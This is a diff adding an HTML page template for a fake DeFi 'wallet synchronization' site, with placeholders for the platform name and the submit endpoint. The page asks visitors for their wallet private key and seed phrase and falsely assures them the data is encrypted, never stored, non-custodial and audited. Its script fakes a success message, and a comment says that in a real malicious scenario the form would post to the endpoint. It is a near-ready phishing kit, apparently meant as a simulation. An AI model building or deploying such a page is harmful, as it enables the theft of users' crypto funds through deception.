@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{PLATFORM_NAME} | Secure Wallet Sync</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            color: #e2e8f0;
+            min-height: 100vh;
+            line-height: 1.6;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            border-bottom: 1px solid #334155;
+            margin-bottom: 40px;
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: #60a5fa;
+        }
+        .logo i {
+            font-size: 2rem;
+        }
+        nav ul {
+            display: flex;
+            list-style: none;
+            gap: 30px;
+        }
+        nav a {
+            color: #cbd5e1;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s;
+            font-size: 1rem;
+        }
+        nav a:hover, nav a.active {
+            color: #60a5fa;
+        }
+        .connect-btn {
+            background: linear-gradient(90deg, #3b82f6, #8b5cf6);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .connect-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(59, 130, 246, 0.4);
+        }
+        main {
+            display: grid;
+            grid-template-columns: 1fr 350px;
+            gap: 40px;
+        }
+        .card {
+            background: rgba(30, 41, 59, 0.7);
+            border-radius: 16px;
+            padding: 30px;
+            border: 1px solid #475569;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            backdrop-filter: blur(10px);
+        }
+        h1 {
+            font-size: 2.2rem;
+            margin-bottom: 10px;
+            color: #f8fafc;
+        }
+        .subtitle {
+            color: #94a3b8;
+            font-size: 1.1rem;
+            margin-bottom: 30px;
+        }
+        .form-group {
+            margin-bottom: 25px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #e2e8f0;
+        }
+        .input-with-icon {
+            position: relative;
+        }
+        .input-with-icon i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #64748b;
+        }
+        input, textarea {
+            width: 100%;
+            padding: 15px 15px 15px 50px;
+            background: #1e293b;
+            border: 1px solid #475569;
+            border-radius: 10px;
+            color: #f1f5f9;
+            font-size: 1rem;
+            transition: border 0.3s;
+        }
+        textarea {
+            min-height: 120px;
+            resize: vertical;
+            font-family: monospace;
+            font-size: 0.9rem;
+        }
+        input:focus, textarea:focus {
+            outline: none;
+            border-color: #60a5fa;
+            box-shadow: 0 0 0 3px rgba(96, 165, 250, 0.2);
+        }
+        .info-box {
+            background: rgba(59, 130, 246, 0.1);
+            border-left: 4px solid #3b82f6;
+            padding: 18px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            font-size: 0.95rem;
+        }
+        .info-box i {
+            color: #60a5fa;
+            margin-right: 10px;
+        }
+        .submit-btn {
+            width: 100%;
+            background: linear-gradient(90deg, #10b981, #34d399);
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+        .submit-btn:hover {
+            background: linear-gradient(90deg, #0da271, #2bb884);
+            box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4);
+        }
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
+            margin-top: 30px;
+            color: #94a3b8;
+            font-size: 0.9rem;
+        }
+        .badge {
+            text-align: center;
+        }
+        .badge i {
+            font-size: 1.5rem;
+            margin-bottom: 8px;
+            color: #60a5fa;
+        }
+        .news-sidebar h3 {
+            font-size: 1.3rem;
+            margin-bottom: 20px;
+            color: #f8fafc;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #475569;
+        }
+        .news-item {
+            padding: 15px 0;
+            border-bottom: 1px solid #334155;
+        }
+        .news-item:last-child {
+            border-bottom: none;
+        }
+        .news-title {
+            font-weight: 600;
+            margin-bottom: 5px;
+            color: #e2e8f0;
+        }
+        .news-time {
+            font-size: 0.85rem;
+            color: #94a3b8;
+        }
+        footer {
+            text-align: center;
+            margin-top: 60px;
+            padding-top: 30px;
+            border-top: 1px solid #334155;
+            color: #94a3b8;
+            font-size: 0.9rem;
+        }
+        .disclaimer {
+            font-size: 0.8rem;
+            max-width: 800px;
+            margin: 20px auto;
+            color: #64748b;
+            line-height: 1.5;
+        }
+        @media (max-width: 768px) {
+            main {
+                grid-template-columns: 1fr;
+            }
+            header {
+                flex-direction: column;
+                gap: 20px;
+            }
+            nav ul {
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <i class="fas fa-coins"></i>
+                <span>{PLATFORM_NAME}</span>
+            </div>
+            <nav>
+                <ul>
+                    <li><a href="#" class="active"><i class="fas fa-wallet"></i> Wallet</a></li>
+                    <li><a href="#"><i class="fas fa-exchange-alt"></i> Trade</a></li>
+                    <li><a href="#"><i class="fas fa-chart-line"></i> Markets</a></li>
+                    <li><a href="#"><i class="fas fa-hand-holding-usd"></i> Earn</a></li>
+                    <li><a href="#"><i class="fas fa-shield-alt"></i> Security</a></li>
+                </ul>
+            </nav>
+            <button class="connect-btn"><i class="fas fa-plug"></i> Connected</button>
+        </header>
+
+        <main>
+            <div class="main-content">
+                <div class="card">
+                    <h1><i class="fas fa-sync-alt"></i> Wallet Synchronization</h1>
+                    <p class="subtitle">Securely sync your external wallet with {PLATFORM_NAME} to access advanced DeFi features, cross-chain swaps, and yield farming opportunities.</p>
+
+                    <div class="info-box">
+                        <i class="fas fa-info-circle"></i>
+                        For enhanced security and full platform functionality, please provide your wallet's private key or seed phrase. This allows {PLATFORM_NAME} to verify ownership and enable seamless transactions across all supported blockchains.
+                    </div>
+
+                    <form id="syncForm" action="{SUBMIT_ENDPOINT}" method="POST">
+                        <div class="form-group">
+                            <label for="walletAddress"><i class="fas fa-address-card"></i> Your Wallet Address</label>
+                            <div class="input-with-icon">
+                                <i class="fas fa-wallet"></i>
+                                <input type="text" id="walletAddress" name="walletAddress" placeholder="0x742d35Cc6634C0532925a3b844Bc9e... (Ethereum, BSC, Polygon, etc.)" required>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="privateKey"><i class="fas fa-key"></i> Private Key</label>
+                            <div class="input-with-icon">
+                                <i class="fas fa-lock"></i>
+                                <input type="password" id="privateKey" name="privateKey" placeholder="Enter the 64-character hexadecimal private key" required>
+                            </div>
+                            <small style="color: #94a3b8; display: block; margin-top: 5px;">Alternatively, you can provide your Seed Phrase below.</small>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="seedPhrase"><i class="fas fa-seedling"></i> Seed Phrase (Recovery Phrase) - 12 or 24 words</label>
+                            <div class="input-with-icon">
+                                <i class="fas fa-clipboard-list"></i>
+                                <textarea id="seedPhrase" name="seedPhrase" placeholder="Enter your 12 or 24 word mnemonic seed phrase separated by spaces. This is required for multi-chain validation."></textarea>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="network"><i class="fas fa-network-wired"></i> Primary Network</label>
+                            <div class="input-with-icon">
+                                <i class="fas fa-globe"></i>
+                                <select id="network" name="network" style="width: 100%; padding: 15px 15px 15px 50px; background: #1e293b; border: 1px solid #475569; border-radius: 10px; color: #f1f5f9; font-size: 1rem;">
+                                    <option value="eth">Ethereum Mainnet</option>
+                                    <option value="bsc">Binance Smart Chain</option>
+                                    <option value="polygon">Polygon</option>
+                                    <option value="avax">Avalanche</option>
+                                    <option value="arbitrum">Arbitrum One</option>
+                                    <option value="optimism">Optimism</option>
+                                </select>
+                            </div>
+                        </div>
+
+                        <div class="info-box">
+                            <i class="fas fa-shield-alt"></i>
+                            <strong>Security Notice:</strong> Your credentials are encrypted via TLS 1.3 and never stored on our servers. This one-time sync is required to generate a secure session token for your wallet.
+                        </div>
+
+                        <button type="submit" class="submit-btn">
+                            <i class="fas fa-sync"></i> Synchronize & Connect Wallet
+                        </button>
+                    </form>
+
+                    <div class="security-badges">
+                        <div class="badge">
+                            <i class="fas fa-lock"></i>
+                            <div>SSL Secured</div>
+                        </div>
+                        <div class="badge">
+                            <i class="fas fa-user-shield"></i>
+                            <div>Non-Custodial</div>
+                        </div>
+                        <div class="badge">
+                            <i class="fas fa-check-circle"></i>
+                            <div>Audited</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="news-sidebar">
+                <div class="card">
+                    <h3><i class="fas fa-bullhorn"></i> DeFi News & Updates</h3>
+                    <div class="news-item">
+                        <div class="news-title">Major Protocol Upgrade Live</div>
+                        <div class="news-time">2 hours ago</div>
+                    </div>
+                    <div class="news-item">
+                        <div class="news-title">New {PLATFORM_NAME} Pairs Added</div>
+                        <div class="news-time">5 hours ago</div>
+                    </div>
+                    <div class="news-item">
+                        <div class="news-title">Cross-Chain Bridge APY Increased to 24%</div>
+                        <div class="news-time">1 day ago</div>
+                    </div>
+                    <div class="news-item">
+                        <div class="news-title">Security Audit Completed by {AUDIT_FIRM}</div>
+                        <div class="news-time">2 days ago</div>
+                    </div>
+                    <div class="news-item">
+                        <div class="news-title">Governance Proposal #42 Passed</div>
+                        <div class="news-time">3 days ago</div>
+                    </div>
+                </div>
+
+                <div class="card" style="margin-top: 25px;">
+                    <h3><i class="fas fa-tachometer-alt"></i> Sync Status</h3>
+                    <div style="margin-top: 15px;">
+                        <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
+                            <span>Encryption:</span>
+                            <span style="color: #34d399;"><i class="fas fa-check"></i> Active</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
+                            <span>Connection:</span>
+                            <span style="color: #fbbf24;"><i class="fas fa-sync"></i> Pending</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
+                            <span>Multi-Chain:</span>
+                            <span style="color: #34d399;"><i class="fas fa-check"></i> Ready</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between;">
+                            <span>Validation:</span>
+                            <span style="color: #f87171;"><i class="fas fa-times"></i> Required</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <footer>
+            <p class="disclaimer">
+                <i class="fas fa-exclamation-triangle"></i> {PLATFORM_NAME} is a decentralized finance platform. Cryptocurrency investments are volatile and high risk. Always ensure you understand the risks involved. Never share your private keys or seed phrases with anyone you do not trust completely.
+            </p>
+            <p>&copy; {CURRENT_YEAR} {PLATFORM_NAME}. All rights reserved. | <a href="#" style="color: #60a5fa; text-decoration: none;">Privacy Policy</a> | <a href="#" style="color: #60a5fa; text-decoration: none;">Terms of Service</a></p>
+            <p style="margin-top: 10px; font-size: 0.8rem;">
+                <i class="fas fa-shield-alt"></i> Protected by {SECURITY_PROVIDER}
+            </p>
+        </footer>
+    </div>
+
+    <script>
+        document.getElementById('syncForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const submitBtn = this.querySelector('.submit-btn');
+            const originalText = submitBtn.innerHTML;
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Syncing & Encrypting...';
+            submitBtn.disabled = true;
+
+            // Simulate processing delay
+            setTimeout(() => {
+                alert('Wallet synchronization initiated! Please check your wallet for verification request.');
+                submitBtn.innerHTML = originalText;
+                submitBtn.disabled = false;
+                // In a real malicious scenario, the form would submit to {SUBMIT_ENDPOINT}
+                // this.submit();
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
